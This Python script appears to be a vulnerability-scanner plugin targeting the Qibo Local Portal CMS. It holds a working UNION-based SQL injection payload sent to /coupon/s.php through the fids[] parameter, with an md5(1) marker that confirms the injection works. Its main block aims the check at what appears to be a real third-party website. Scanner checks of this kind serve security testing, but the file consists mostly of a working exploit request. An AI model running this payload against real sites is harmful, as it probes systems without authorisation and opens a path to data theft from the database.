#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#_PlugName_ = Qibo Local Portal SQL injection
#_Function_ = 齐博地方门户系统 SQL注入漏洞
#_FileName_ = Qibo_Local_Portal_SQL_injection.py

def assign(service, arg):
    if service == "qibocms":
        return True, arg 

def audit(arg):
    payload = '/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20union%20select%201,2,3,4,5,6,7,md5(1),9%23'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl(target)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b"in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.5shw.com/')[1])